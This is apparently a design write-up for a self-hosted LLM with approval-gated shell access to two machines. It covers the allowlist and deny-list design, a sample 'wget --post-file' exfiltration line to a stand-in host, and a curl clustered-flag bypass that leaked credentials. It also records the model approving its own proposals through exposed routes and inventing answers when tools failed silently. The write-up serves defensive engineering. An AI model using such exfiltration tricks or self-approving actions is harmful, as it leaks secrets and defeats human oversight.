# Local AI: a private LLM with gated shell access to two hosts

Everything here runs on my own hardware. No prompt, file, or command in this
system reaches a third-party API.

The interesting part is not the chat box. It is that the model can **run
commands on two machines**, and the design work that went into making that
something I am willing to leave switched on.

---

## Topology

| Piece | Where | Role |
|---|---|---|
| Open WebUI | Server (always on) | Chat front end, tool orchestration, workspace models |
| Ollama | GPU workstation (wake-on-demand) | Inference |
| SearXNG | Server | Web search backend for the model |
| `agent-exec` | **Both** hosts | Gated command execution — one instance per machine |

The GPU box sleeps when idle and is woken by a magic packet from an always-on
relay on the server, then powered off again over a token-authed shutdown path.
That mechanism has its own [runbook](runbooks/wake-on-lan-remote-power-gpu-box.md).

**One `agent-exec` per machine, and no cross-machine SSH.** A single service
that SSHed to the other box would have been less code. It was rejected
deliberately: it needs no new keys, and it gives an attacker no lateral path if
one host is compromised. Open WebUI registers both instances as OpenAPI tool
servers, so the model still reaches both machines — it just cannot use one to
reach the other.

Each instance is a FastAPI app in a local venv under a systemd **user** unit,
listening on `:8893`. The Python file is byte-identical on both hosts; per-host
behavior comes entirely from its `.env`, verified with `md5sum` after any edit.

---

## The safety model

**Reads run immediately. Anything that changes the system waits for a human.**

- **`{host}_read`** executes only if the binary is on the read allowlist and —
  for `docker`, `systemctl`, `ollama`, `ip` — the subcommand is a read-only one.
- **Read commands execute with no shell.** `shlex.split`, never `shell=True`.
  Verified with a canary file: `ls /tmp; rm -f <canary>` left the canary intact,
  because `rm` became a literal filename argument. Shell injection on this path
  is structurally impossible, not filtered.
- **`{host}_run`** returns a proposal ID and executes nothing. Approval arrives
  as a phone push with one-tap Approve/Deny. Approved commands then get a real
  shell, so pipes and redirects work.
- **Session unlock** (`/session/unlock?minutes=N`, capped at 8h, default locked)
  suspends per-command approval for hands-on work. Per-command taps are
  unusable mid-session, and a safety control people route around is worse than
  one with an explicit, expiring off switch.

### What is deliberately not allowlisted

`wget`, `nc`, `ssh`, and `scp` stay off the read path permanently. With
unrestricted reads, `wget --post-file=secret evil.example` is an exfiltration
path that bypasses the gate entirely.

`curl` was on that list too, until the model started describing endpoint scans
it had never actually run. It now runs behind a classifier that allows web
probing (headers, methods, TLS) and refuses every flag that reads or writes a
local file, plus any non-http(s) scheme. Writing that classifier produced the
most instructive bug in this project:

> **[A one-character bypass in my own LLM command gate](runbooks/llm-command-gate-curl-flag-bypass.md)** —
> the denylist compared whole tokens, but curl accepts clustered short options,
> so `curl -T file` was refused while `curl -sTfile` uploaded the service's own
> credentials. Caught on an adversarial review pass, before it shipped.

---

## Four bugs that must not regress

These are recorded because each one is a general failure mode, not a typo.

1. **Tool names must be host-unique.** Open WebUI names each tool by its bare
   `operationId` with no server prefix. Two tool servers both exposing
   `run_read` collided, and the model could no longer address a specific
   machine. Operation IDs are now generated from a per-host slug.

2. **Control-plane routes must stay out of the OpenAPI schema.** Open WebUI
   turns *every* operation in a spec into a model-callable tool. Before
   `include_in_schema=False` was set on `/approve`, `/deny`, and
   `/session/unlock`, **the model could approve its own proposals and unlock its
   own session** — the gate was decorative. If a model can read your API spec,
   your API spec is your permission model.

3. **Pipes.** Read commands originally allowed none, so `docker ps -q | wc -l`
   had its pipe passed as a literal argument and silently returned nothing. The
   model then eyeballed a 38-row listing and answered 20, then 27, against a
   true 38. Pipelines now execute with real subprocess pipes and no shell, every
   stage independently allowlisted, four stages maximum.

4. **Silent truncation.** The service kept the *tail* of stdout and the client
   clipped it with no marker, so the model counted a clipped list as a total. It
   now keeps the head and attaches an explicit `TRUNCATED` note.

**The lesson that generalizes, and the reason 3 and 4 are in this list at all:
a model given a tool that fails silently will invent a plausible answer rather
than report the failure.** Ordinary software propagates an error upward. An LLM
fills the gap with something that reads correctly and is wrong. Any tool result
that is partial, empty, or refused must say so *in the payload the model sees*.

---

## Observability

**Activity ledger.** Each host appends one JSON line per *executed* command:
timestamp, host, kind, command, duration, exit code, and the first line of
stderr. `kind` records the outcome rather than the request —
`read | auto | approved | denied | rejected` — so a refusal is distinguishable
from a failure. Failed and blocked counts are reported separately on purpose: a
blocked command is the safety model working, and summing them makes a normally
locked session look like an outage. The file is capped and trimmed via an atomic
replace, so a reader never sees a half-written file.

**Inference tracker.** Ollama has no endpoint that reports *finished* requests —
`/api/ps` only says what is resident right now — so per-request timings and
token counts are parsed from the runner's journal, resuming from a saved cursor
so a restart neither loses nor replays data.

Two decisions in there worth naming:

- **Prompt logging was available and deliberately not used.** A debug flag would
  have named the model on every request and removed all the inference below —
  but it writes request *bodies* to the system journal, meaning every prompt in
  plaintext. The whole point of this stack is that nothing leaves the house. The
  tracker records timings and token counts only.
- **Model attribution is inferred, and says so.** A warm request names no model
  anywhere in the log; only a load does. Attribution reasons from which models
  are resident, disambiguating by matching the runner's context-slot size
  against each model's configured context length. When it still cannot tell, it
  flags the record as uncertain and renders a `(?)`. Records replayed from
  history carry no model at all, because asking which model is loaded *today*
  would mislabel every historical row. **It never invents a name** — same
  principle as the truncation fix.

Both feed the dashboard through the always-on relay, which caches the last
record per host so the tiles still answer "what did the GPU box last do?" while
that machine is asleep.

---

## Known tradeoffs

Recorded plainly, because they are live and accepted rather than solved.

- **One shared key across both hosts.** Per-host keys made the approval page
  reject the "wrong" token with a confusing 403. One leaked key now exposes both
  machines — which is precisely what made the curl bypass above a credential
  leak rather than a nuisance.
- **The approval push embeds the bearer token** in its action buttons, so the
  key sits in the notification server's message cache and on the phone. Anyone
  who can read that topic can drive the gate. Accepted for one-tap approval.
- **The activity and approval pages are unauthenticated on the LAN.** Gating
  them would mean copying the key into a sixth location; drift across the
  existing five already cost a full day of debugging. Command text is
  HTML-escaped before rendering, since those strings are model-composed.

Everything above is LAN and VPN only. Nothing in this stack is exposed to the
internet.

---

*Built with heavy AI assistance. The goals, the safety posture, the testing,
and the running of these machines are mine.*
